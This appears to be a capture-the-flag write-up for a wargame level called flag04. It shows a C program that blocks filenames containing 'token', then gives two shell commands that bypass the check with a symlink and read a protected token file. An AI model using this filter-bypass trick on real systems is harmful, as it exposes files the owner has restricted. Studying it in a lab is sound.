## Goal

Read from the unreadable `token` file.

## Source code

flag04.c

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

## Exploit

The `/home/flag04` directory has a `token` file that is not readable to anybody but the owner. However, there is also a C executable
in that directory that takes a filename and reads it. However, the file has a protection in place that it will not read any filename
containing the substring `token`. 

To get around this, we use symlinks. Simply symlinking the file and then having the `flag04` executable open the symlinked file will
read the token file for us. These are the commands:

```
ln -s ./token ~/link
./flag04 ~/link
```
